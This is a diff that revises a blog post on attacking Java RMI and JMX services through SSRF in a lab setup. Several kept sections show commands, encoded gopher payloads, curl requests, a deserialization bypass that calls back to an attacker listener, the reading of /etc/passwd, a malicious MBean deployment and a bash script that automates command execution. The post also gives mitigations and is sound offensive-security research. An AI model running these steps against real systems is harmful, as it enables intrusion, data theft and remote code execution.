@@ -1,14 +1,16 @@
 ---
 title: "Attacking Java RMI via SSRF"
-date: 2021-12-10
+date: 2021-12-30
 author: "Tobias Neitzel"
 
 tags: 
+- dgc
 - rmi
 - jmx
 - ssrf
 - java rmi
 - remote-method-guesser
+- registry
 - beanshooter
 
 categories:
@@ -48,45 +50,49 @@ frequently. Moreover, even a fully patched *RMI* service can yield as an
 entry point for attackers when the available *remote objects* expose dangerous
 functions.
 
-If you ever implemented something yourself using *Java RMI*, you probably
+If you ever implemented something using *Java RMI*, you probably
 doubt that the protocol can be targeted by *SSRF* attacks. For those who
 never used *Java RMI* in practice, here is a short example how a typical *RMI*
 client looks like:
 
-{{< highlight java "linenos=table" >}}
-import java.rmi.registry.LocateRegistry;
+```java
 import java.rmi.registry.Registry;
+import java.rmi.registry.LocateRegistry;
+import eu.tneitzel.rmi.interfaces.RemoteService;
 
 public class ExampleClient {
 
-  public static void main(String[] args) {
+  private static final String remoteHost = "172.17.0.2";
+  private static final String boundName = "remote-service";
 
+  public static void main(String[] args)
+  {
     try {
       Registry registry = LocateRegistry.getRegistry(remoteHost);
-      RemoteService ref = (RemoteService)registry.lookup("remote-service");
-      String response = ref.getVersion();
+      RemoteService ref = (RemoteService)registry.lookup(boundName);
+      String response = ref.remoteMethod();
     
     } catch( Exception e) {
       e.printStackTrace();
     }
   }
 }
-{{< / highlight >}}
+```
 
 This code snipped does basically the following:
 
-1. Connect to an *RMI registry* (name service for *remote objects*. Can be compared to *DNS*)
-2. Lookup the name ``remote-service`` to obtain a reference to an *remote object*
-3. Call the ``getVersion`` function on the *remote object*
+1. Connect to an *RMI registry* (a name service for *Java RMI*, comparable to *DNS*)
+2. Lookup the name ``remote-service`` to obtain a reference to the *remote object*
+3. Call the ``remoteMethod`` function on the *remote object*
 
-Despite ``ref`` is an object created in your local *JVM*, calls on this object
+Despite ``ref`` is an object created in your local *Java Virtual Machine*, calls on this object
 are forwarded to the *RMI* server. This demonstrates that *Java RMI* uses an *object
 oriented RPC* mechanism, where local objects are used to consume remote services.
 This *object oriented RPC* implementation creates the impression of a strong coupling
-between the local objects and the remote service which makes *SSRF* attacks seem impossible.
+between the local objects and the remote service, which makes *SSRF* attacks seem impossible.
 But this is not the case as the *RMI protocol* is, like *HTTP*, a stateless protocol and
 there is only a loosely coupling between local objects and remote services. But we go ahead
-of ourselves as we should start with the *RMI registry*.
+of ourselves and should start with the *RMI registry*.
 
 ### The RMI Registry
 
@@ -95,11 +101,11 @@ on the network. In order to connect to a *remote object*, clients usually need a
 amount of information:
 
 * The IP address and TCP port the *remote object* is available on
-* The class / interface that is implemented by the *remote object*
-* The ``ObjID`` of the *remote object* (an internal identifier)
+* The class or interface that is implemented by the *remote object*
+* The ``ObjID`` value of the *remote object* (an internal identifier)
 
 All this information is stored within the *RMI registry*  and can be accessed under a human readable
-name (*boundname*). In the example above, we looked up the human readable name ``remote-service``
+name (*bound name*). In the example above, we looked up the human readable name ``remote-service``
 from the *RMI registry* and obtained a reference to the corresponding *remote object*. This reference
 stores all the required information for remote procedure calls and forwards method invocations to
 the *remote object*.
@@ -108,12 +114,11 @@ An important detail is now, that the *RMI registry* is a *remote object* itself,
 to the ``RemoteService`` *remote object*, the *RMI registry* is a well known *remote object*. This
 means, that the implemented class and the assigned ``ObjID`` are fixed and known by *RMI clients*.
 Hence, to communicate with the *RMI registry*, only the IP address and the TCP port are required.
-This makes the *RMI registry* an easier target for *SSRF* attacks and we discuss it first before
-going over to non well known *RMI services*.
+This makes the *RMI registry* an easier target for *SSRF* attacks.
 
 ### The Java RMI Protocol
 
-Whether or not the *RMI registry* can now be targeted by *SSRF* attacks depends on the structure of the
+Whether or not *RMI services* can be targeted by *SSRF* attacks depends on the structure of the
 *RMI* protocol. In the following diagram I tried to visualize how a typical *RMI* communication looks like:
 
 {{< figure src="/img/01-rmi-ssrf/02-java-rmi-protocol.png" title="Java RMI Protocol" >}}
@@ -121,7 +126,7 @@ Whether or not the *RMI registry* can now be targeted by *SSRF* attacks depends 
 The typical *RMI* communication consists out of a *handshake* and one or more *method calls*. During the
 *handshake*, some static data and information on the server and client host are exchanged. It is worth noting
 that none of the exchanged information depends on previously received data. Therefore, it is possible
-to predict all values that are used in the handshake, which will be important when performing *SSRF* attacks.
+to predict all values that are used during handshake, which will be important when performing *SSRF* attacks.
 
 After the *handshake* completed, the client can start to dispatch method calls. It is generally possible
 to dispatch multiple method calls in one communication channel, but apart from reducing the amount of
@@ -139,8 +144,8 @@ utilized during an *SSRF* attack:
 
 Another problem we have not talked about so far are data types. It should be obvious that a basic *HTTP* based
 *SSRF* vulnerability cannot be utilized to perform *SSRF* attacks on *RMI* services. Already the first few bytes
-(*RMI Magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
-able to send arbitrary bytes to the target *RMI service*, which is an annoying restriction. Especially null bytes need
+(the *RMI magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
+able to send arbitrary bytes to the target *RMI service*. Especially null bytes need
 to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions [\[1\]](#references).
 However, when this condition is met and you can send arbitrary data to the *RMI* service, you can dispatch
 calls as with a direct connection.
@@ -171,12 +176,12 @@ connection type is *reusable*, the *Stream Protocol* is used. The only connectio
 [TCPConnection class](https://github.com/openjdk/jdk/blob/ad1dc9c2ae5463363aff20072a3f2ca4ea23acd2/src/java.rmi/share/classes/sun/rmi/transport/tcp/TCPConnection.java#L117),
 that contains the following function definition:
 
-{{< highlight java "linenos=table" >}}
+```java
 public boolean isReusable()
 {
     return true;
 }
-{{< / highlight >}}
+```
 
 This makes it difficult to modify the protocol type, even when using reflection.
 
@@ -187,35 +192,36 @@ also generate *Stream Protocol* payloads using the ``--stream-protocol`` option.
 
 Concerning the *SSRFibility* of *Java RMI*, where is not a big different between *Stream* and *Single Operation Protocol* and both can be used
 to launch *SSRF* attacks. Using the *Stream Protocol*, I expected some problems with idle connections, as the *RMI* server may
-wait for additional *RMI* calls after processing the call supplied via *SSRF*. However, during my tests I never observed this
+wait for additional *RMI* calls after processing the initial call supplied via *SSRF*. However, during my tests I never observed this
 behavior.
 
 
 ### The ObjID Problem
 
-An attack as demonstrated in *figure 2* requires the client to know all data that needs to be send to the *RMI server*
+Performing an *SSRF* attack on *Java RMI* requires the client to know all data that needs to be send to the *RMI server*
 in advance. This is possible for well known *RMI* services with a fixed ``ObjID`` value like the *RMI registry* (``ObjID = 0``),
 the *Activation System* (``ObjID = 1``) or the *Distributed Garbage Collector* (``ObjID = 2``). Other *remote objects*
-get a random ``ObjID`` assigned when they are exported (bound to a *TCP* port). Guessing an ``ObjID`` is basically impossible,
+get a random ``ObjID`` assigned when they are bound to a *TCP* port. Guessing an ``ObjID`` is basically impossible,
 as it consists out of the following components:
 
 * ``objNum`` - A random ``long`` value created by ``SecureRandom`` (set once per object)
 * ``UID`` - Compound Object
   * ``unique``- A random ``int`` value created by ``SecureRandom`` (set once per host)
   * ``time`` - A timestamp created during export as ``int`` value
-  * ``count`` - An incrementing ``short`` starting at ``Shot.MIN_VALUE``
+  * ``count`` - An incrementing ``short`` starting at ``Short.MIN_VALUE``
 
-Getting the ``ObjID`` value for a *remote object* is one of the reasons why *RMI* clients usually need to talk to an *RMI registry*.
+Getting the ``ObjID`` value for a *remote object* is one of the reasons why *RMI* clients usually need to talk to an *RMI registry* before
+they can use the *RMI* service.
 
-So, are *SSRF* attacks on custom *RMI endpoints* impossible now? Well, not completely impossible, but they require an *SSRF* vulnerability
-with even more capabilities as in the previous case. Instead of performing a *one shot* attack, we now need at least two shots:
+Are *SSRF* attacks on custom *RMI endpoints* impossible now? Well, not completely impossible, but they require an *SSRF* vulnerability
+with even more capabilities as discussed previously. Instead of performing a *one shot* attack, we now need at least two shots:
 
-1. Use the *SSRF* vulnerability to perform a ``lookup`` call on the registry
+1. Use the *SSRF* vulnerability to perform a ``lookup`` call on the *RMI registry*
 2. Use the obtained ``ObjID`` value to target the *remote object* via *SSRF*
 
 For this to work we obviously need an *SSRF* vulnerability that returns data obtained from the targeted endpoint. Furthermore, the *SSRF*
 need to allow arbitrary bytes within the returned data, including null bytes. *SSRF* vulnerabilities with these properties are extremely
-rare, but when all conditions are met, you can consume any *RMI* service as with a direct connection.
+rare, but when all conditions are satisfied, you can consume any *RMI* service as with a direct connection.
 
 
 ## Attacking the RMI Registry
@@ -232,7 +238,7 @@ that we can use for demonstration purposes. The setup for the following demonstr
 * ``CommonsCollections3.1`` being available on the *RMI* application's classpath
 * The *SSRF* vulnerability is *curl* based and allows null bytes within the *gopher* protocol
 
-We start of with an *nmap* scan to demonstrate that no *RMI* ports are exposed directly by the application server:
+We start of with a *nmap* scan to demonstrate that no *RMI* ports are exposed directly by the application server:
 
 ```console
 $ nmap -p- -n 172.17.0.2
@@ -256,7 +262,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 Now we perform a deserialization attack on the *RMI registry*. The *Java* version on the application server
-already implements deserialization filters for *registry* communication, but is vulnerable to known deserialization
+already implements deserialization filters for *registry* communication, but it is vulnerable to known deserialization
 filter bypasses. These bypasses work by creating an outbound *RMI* connection to an attacker controlled server.
 This outbound connection is no longer protected by deserialization filters and can be used to achieve arbitrary
 deserialization.
@@ -276,10 +282,10 @@ Ncat: Listening on 0.0.0.0:4445
 ```
 
 Now we create the *SSRF* payload. Creating *SSRF* payloads with *remote-method-guesser* is quite simple. Almost
-each operation supports the ``--ssrf`` option. Instead of performing the corresponding operation on a remote server,
-a corresponding *SSRF* payload is printed to stdout. For our purpose we need to target the *RMI registry* on the
-remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload, which is the most
-recent deserialization filter bypass:
+each operation supports the ``--ssrf`` option. With this option set, instead of performing the requested operation
+on a remote server, a corresponding *SSRF* payload is generated. For our purpose we need to target the *RMI registry*
+on the remote server which listens on ``localhost:1090``. Furthermore, we use the ``AnTrinh`` payload, which is the
+most recent deserialization filter bypass:
 
 ```console
 $ rmg serial 127.0.0.1 1090 AnTrinh 172.17.0.1:4444 --component reg --ssrf --gopher --encode
@@ -326,19 +332,19 @@ shows all of the above mentioned steps in action:
 
 ## Attacking Custom RMI Services
 
-The ssrf-server [3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server) from
-the *remote-method-guesser* repository runs one custom *RMI service* that is, like the *RMI registry*, only reachable from localhost.
-The corresponding service implements the ``IFileManager`` interface with the following method signatures:
+The ssrf-server [\[3\]](#references) from the *remote-method-guesser* repository runs one custom *RMI service* that is,
+like the *RMI registry*, only reachable from localhost.  The corresponding service implements the ``IFileManager``
+interface with the following method signatures:
 
-{{< highlight java "linenos=table" >}}
+```java
 public interface IFileManager extends Remote
 {
-    File[] list(String dir) throws RemoteException;
-    byte[] read(String file) throws RemoteException, IOException;
-    String write(String file, byte[] content) throws RemoteException, IOException;
-    String copy(String src, String dest) throws RemoteException, IOException, InterruptedException;
+    File[] list(String dir);
+    byte[] read(String file);
+    String write(String file, byte[] content);
+    String copy(String src, String dest);
 }
-{{< / highlight >}}
+```
 
 We want to use the *SSRF* vulnerability in the *HTTP* frontend to call the ``read`` method and extract the ``/etc/passwd``
 file from the server. Sounds easy, but we need to obtain the *TCP* endpoint and the ``ObjID`` value of the *remote object*
@@ -348,7 +354,7 @@ first and are required to perform a lookup operation on the *RMI registry* via *
 When using *remote-method-guesser's* ``enum`` action, several different checks are performed on the targeted *RMI endpoint*.
 On *RMI registry* endpoints, one of the checks includes a lookup for all available *remote objects*. When using the ``--ssrf``
 option together with the ``enum`` action, it is not possible to perform multiple checks at once and the created *SSRF* payload
-performs only a single check. You can use the ``--scan-action <ACTION>`` option to select which check you want to perform.
+performs only a single check. You can use the ``--scan-action <CHECK>`` option to select which check you want to perform.
 In out case, we want to perform the ``list`` check, that lists all available bound names within the *RMI registry*:
 
 ```console
@@ -373,7 +379,7 @@ $ rmg enum 127.0.0.1 1090 --scan-action list --ssrf-response 51aced0005770f0183f
 
 Now we obtained the available *bound names* within the *RMI registry*, but we are still missing the *TCP* endpoint and the ``ObjID`` value.
 The problem here is that *remote-method-guesser* needs to perform a call to the registry's ``list`` function first, before it can perform the
-``lookup`` call.  As only one call is possible per *SSRF* attack, the ``lookup`` action is therefore missing. However, we can use the
+``lookup`` call.  As only one call is possible per *SSRF* attack, the ``lookup`` call is missing. However, we can use the
 ``--bound-name`` option to specify the targeted *bound name* directly and *remote-method-guesser* skips the ``list`` call in this case:
 
 ```console
@@ -442,7 +448,7 @@ curl_user:x:100:101:Linux User,,,:/home/curl_user:/sbin/nologin
 *JMX* is probably one of the most well known *RMI services* and is usually a reliable and easy target for attackers.
 Instead of securing *JMX* services correctly with user authentication or client certificates, administrators often
 take the easy route and prevent access to *JMX* services from untrusted networks. This makes *SSRF* attacks on *JMX*
-endpoints an interesting topic, as it may allows to attack unreachable *JMX* endpoints.
+endpoints an interesting topic, as it may allows to attack unreachable *JMX* endpoints in the backend.
 
 From the *SSRF* perspective, *JMX* is very similar to the custom *RMI service* discussed before. Despite being a well
 known service, *JMX* endpoints do not have a fixed ``ObjID`` value. A ``lookup`` operation on the *RMI registry* is
@@ -451,7 +457,7 @@ that we have not encountered so far and this is *session management*.
 
 *JMX* supports password protected endpoints and needs therefore to implement *session management*. The *RMI protocol*
 has no built in support for *session management*, but it is a common practice to use the ``ObjID`` mechanism for
-session management. We already said that custom *remote objects* get assigned a randomly generated ``ObjID`` value during
+this purpose. We already said that custom *remote objects* get assigned a randomly generated ``ObjID`` value during
 export and that clients are unable to use the *remote objects* without knowing their ``ObjID``. To make *remote objects*
 publicly available, one binds them to an *RMI registry* service, but without doing this, the *remote object* can only be
 accessed by clients that somehow obtained the ``ObjID`` value.
@@ -460,20 +466,20 @@ When a client wants to connect to a *JMX* service, it first looks up the corresp
 The *remote object* that is returned by the registry implements the interface ``javax.management.remote.rmi.RMIServer``
 and only supports two methods:
 
-{{< highlight java "linenos=table" >}}
+```java
 public interface RMIServer extends Remote {
     public String getVersion() throws RemoteException;
     public RMIConnection newClient(Object credentials) throws IOException;
 }
-{{< / highlight >}}
+```
 
 To interact with the *JMX* agent, clients need to obtain a *remote object* that implements the ``RMIConnection`` interface.
-Such an object is returned when the client calls the ``newClient`` method and supplies the correct credentials. In this case,
-the initial entry point object that implements the ``RMIServer`` interface exports a new *remote object* that implements the
-``RMIConnection`` interface. Instead of binding the result to an *RMI registry*, where it could be looked up by everyone, a
-reference to the *remote object* is returned to the client that called the ``newClient`` method. The client is then the only
-one who obtained the ``ObjID`` value for the new *remote object* and no other clients can interact with it. This demonstrates
-how ``ObjID`` values can yield as a *session id* equivalent.
+Such an object is returned when the client calls the ``newClient`` method on the ``RMIServer`` *remote object* and supplies
+the correct credentials. In this case, the initial entry point object that implements the ``RMIServer`` interface exports a
+new *remote object* that implements the ``RMIConnection`` interface. Instead of binding the result to an *RMI registry*,
+where it could be looked up by everyone, a reference to the *remote object* is returned to the client that called the
+``newClient`` method. The client is then the only one who obtained the ``ObjID`` value for the new *remote object* and no
+other clients can interact with it. This demonstrates how ``ObjID`` values can yield as a *session id* equivalent.
 
 When targeting *JMX* services via *SSRF*, the *session management* adds one additional step during exploitation:
 
@@ -487,9 +493,8 @@ When targeting *JMX* services via *SSRF*, the *session management* adds one addi
 Notice that the third step needs to be executed in a short time interval after the second step. When obtaining a reference
 to the *remote object* that implements the ``RMIConnection`` interface, a real client would send a corresponding notification
 to the *Distributed Garbage Collector* (*DGC*). This informs the *DGC* that the corresponding *remote object* is in use and
-should not be cleaned up. Since we obtain the reference via *SSRF*, there is no communication to the *DGC*. Shortly after the
-``newClient`` call has generated the new *remote object*, it will be cleaned up by the *DGC*. Therefore, we need to be fast to
-communicate to it.
+should not be cleaned up. Since we obtain the reference via *SSRF*, there is no communication to the *DGC* and shortly after the
+``newClient`` call has generated the new *remote object*, it gets garbage collected. Therefore, we need to be fast.
 
 
 The first thing we need to do is again to obtain the ``ObjID`` and the *TCP port* of the entry point *JMX remote object*.
@@ -500,7 +505,7 @@ $ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf --gopher
 [+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254c%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%2506%256a%256d%2578%2572%256d%2569
 $ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254c%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%2506%256a%256d%2578%2572%256d%2569' --silent | xxd -p -c10000
 51aced0005770f01efa4b9060000017dffd9982080067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f737400009909c700e5371b95b264efa4b9060000017dffd9982080020178
-$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --no-color --ssrf-response 51aced0005770f01efa4b9060000017dffd9982080067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f737400009909c700e5371b95b264efa4b9060000017dffd9982080020178
+$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf-response 51aced0005770f01efa4b9060000017dffd9982080067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f737400009909c700e5371b95b264efa4b9060000017dffd9982080020178
 [+] RMI registry bound names:
 [+]
 [+] 	- jmxrmi
@@ -514,15 +519,15 @@ $ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --no-color --ss
 
 Now we know that the *remote object* listens on ``localhost:39177`` with an ``ObjID`` value of ``[-105b46fa:17dffd99820:-7ffe, -4107030835313135004]``.
 This information is sufficient to call the ``newClient`` method on the *remote object*. We expect the *JMX* service to allow unauthenticated connections
-and pass ``null`` for the required *credential* argument. Furthermore, we can use the ``GenericPrint`` [\[4\]](#references)
-plugin of *remote-method-guesser* to format the return value of the ``newCall`` method in a human readable way:
+and pass ``null`` for the required *credential* argument. Furthermore, we can use the *GenericPrint plugin* [\[4\]](#references)
+of *remote-method-guesser* to parse the return value of the ``newCall`` method:
 
 ```console
 $ rmg call 127.0.0.1 39177 null --objid '[-105b46fa:17dffd99820:-7ffe, -4107030835313135004]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --ssrf --encode --gopher
 [+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A39177%2F_%254a%2552%254d%2549%2500%2502%254c%2550%25ac%25ed%2500%2505%2577%2522%25c7%2500%25e5%2537%251b%2595%25b2%2564%25ef%25a4%25b9%2506%2500%2500%2501%257d%25ff%25d9%2598%2520%2580%2502%25ff%25ff%25ff%25ff%25f0%25e0%2574%25ea%25ad%250c%25ae%25a8%2570
 $ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A39177%2F_%254a%2552%254d%2549%2500%2502%254c%2550%25ac%25ed%2500%2505%2577%2522%25c7%2500%25e5%2537%251b%2595%25b2%2564%25ef%25a4%25b9%2506%2500%2500%2501%257d%25ff%25d9%2598%2520%2580%2502%25ff%25ff%25ff%25ff%25f0%25e0%2574%25ea%25ad%250c%25ae%25a8%2570' --silent | xxd -p -c10000
 51aced0005770f01efa4b9060000017dffd998208008737200326a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49436f6e6e656374696f6e496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f737400009909aa2417597598c184efa4b9060000017dffd9982080070178
-$ rmg call 127.0.0.1 39177 null --objid '[-105b46fa:17dffd99820:-7ffe, -4107030835313135004]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --plugin GenericPrint.jar --no-color --ssrf-response 51aced0005770f01efa4b9060000017dffd998208008737200326a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49436f6e6e656374696f6e496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f737400009909aa2417597598c184efa4b9060000017dffd9982080070178
+$ rmg call 127.0.0.1 39177 null --objid '[-105b46fa:17dffd99820:-7ffe, -4107030835313135004]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --plugin GenericPrint.jar --ssrf-response 51aced0005770f01efa4b9060000017dffd998208008737200326a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49436f6e6e656374696f6e496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f737400009909aa2417597598c184efa4b9060000017dffd9982080070178
 [+] Printing RemoteObject:
 [+] 	Remote Class:           javax.management.remote.rmi.RMIConnectionImpl_Stub
 [+] 	Endpoint:               localhost:39177
@@ -567,7 +572,7 @@ $ beanshooter --stager-only --stager-host 172.17.0.1 --stager-port 8000
 [+] Sending malicious jar file... done!
 ```
 
-The malicious *MBean* that we deployed supports an ``executeCommand`` method that can be used to execute operation system commands.
+The malicious *MBean* that we deployed supports an ``executeCommand`` method that can be used to execute operating system commands.
 We can now trigger this method by using the *SSRF* vulnerability:
 
 ```console
@@ -580,9 +585,9 @@ $ rmg call localhost 39177 'new javax.management.ObjectName("MLetTonkaBean:name=
 ```
 
 Executing all these steps in time before the *JMX remote object* gets garbage collected is pretty difficult. The following
-simple *bash* script can be used to automate the process:
+*bash* script can be used to automate the process:
 
-{{< highlight bash "linenos=table" >}}
+```bash
 #!/bin/bash
 
 SIG_NEW_CLIENT='javax.management.remote.rmi.RMIConnection newClient(Object creds)'
@@ -630,16 +635,16 @@ PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE
 RESULT=$(ssrf "${PAYLOAD}")
 
 rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf-response ${RESULT} --plugin GenericPrint.jar
-{{< / highlight >}}
+```
 
 
 ## Mitigations
 
 ----
 
-Preventing *Server Side Request Forgery* is a topic on it's own and several useful resources are available [\[5\]\[6\]\[7\]](#references).
+Preventing *Server Side Request Forgery* is a topic on it's own and several useful resources are available [\[6\]\[7\]\[8\]](#references).
 However, the attack types discussed in this article demonstrate why it is so important to secure backend services as well. With only a
-few configuration changes, none of the above discussed attacks would have worked. So here are some recommendations for securing *RMI services*:
+few configuration changes, none of the above discussed attacks would have worked. Here are some recommendations for securing *RMI services*:
 
 1. Make sure you use an up to date version of *Java*. The security level of *Java RMI* is constantly improving and outdated
    *Java* versions often contain known vulnerabilities. If you are not able to update, you should at least evaluate your current
@@ -651,10 +656,10 @@ few configuration changes, none of the above discussed attacks would have worked
    certificate based authentication for your *RMI* services.
 3. Implement authentication for your *RMI* services. All *remote objects* that perform sensitive operations should require users
    to authenticate before they can be used. Especially *JMX* services should be password protected and use the *role* model of
-   *JMX* to only grant the required amount of privileges to authenticated users [\[8\]](#referneces).
-4. Make use of deserialization filters for your *RMI* services and only allow required types to be deserialized [\[9\]](#referneces).
-   Also make sure that your applications and third party libraries do not contain classes that perform dangerous actions when being
-   deserialized (*deserialization gadgets*).
+   *JMX* to only grant the required amount of privileges to authenticated users [\[9\]](#referneces).
+4. Make use of deserialization filters for your *RMI* services and only allow required types to be deserialized [\[10\]](#referneces).
+   Also make sure that your applications and third party libraries do not contain classes that perform dangerous actions during
+   deserialization.
 
 
 ## Conclusion
@@ -666,7 +671,7 @@ In this article we demonstrated that *SSRF* attacks on *Java RMI* can work under
 1. The *SSRF* vulnerability needs to allow arbitrary bytes being sent to the backend service (enables attacks on default *RMI* components
    like the *RMI registry*, the *DGC* or the *Activation system*)
 2. The *SSRF* vulnerability needs to return responses from the backend service and accept arbitrary bytes within them (enables attacks
-   on all *RMI endpoints* like *JMX* or custom *remote objects*)
+   on all *RMI endpoints* including *JMX* and custom *remote objects*)
 
 If both of these conditions are satisfied, a backend *RMI service* can be consumed as with a direct connection
 using the *SSRF* vulnerability. If you ever encounter such a service, I would love to hear your experiences regarding
@@ -680,8 +685,9 @@ using the *SSRF* vulnerability. If you ever encounter such a service, I would lo
 * \[2\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
 * \[3\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
 * \[4\] [GenericPrint rmg Plugin (GitHub)](https://github.com/qtc-de/remote-method-guesser/tree/master/plugins)
-* \[5\] [Server-Side Request Forgery Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-* \[6\] [Server-side request forgery (PortSwigger)](https://portswigger.net/web-security/ssrf)
-* \[7\] [What is server-side request forgery (Acunetix)](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
-* \[8\] [Monitoring and Management Using JMX Technology (Oracle)](https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html)
-* \[9\] [Serialization Filtering (Oracle)](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)
+* \[5\] [beanshooter](https://github.com/qtc-de/beanshooter)
+* \[6\] [Server-Side Request Forgery Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+* \[7\] [Server-side request forgery (PortSwigger)](https://portswigger.net/web-security/ssrf)
+* \[8\] [What is server-side request forgery (Acunetix)](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
+* \[9\] [Monitoring and Management Using JMX Technology (Oracle)](https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html)
+* \[10\] [Serialization Filtering (Oracle)](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)
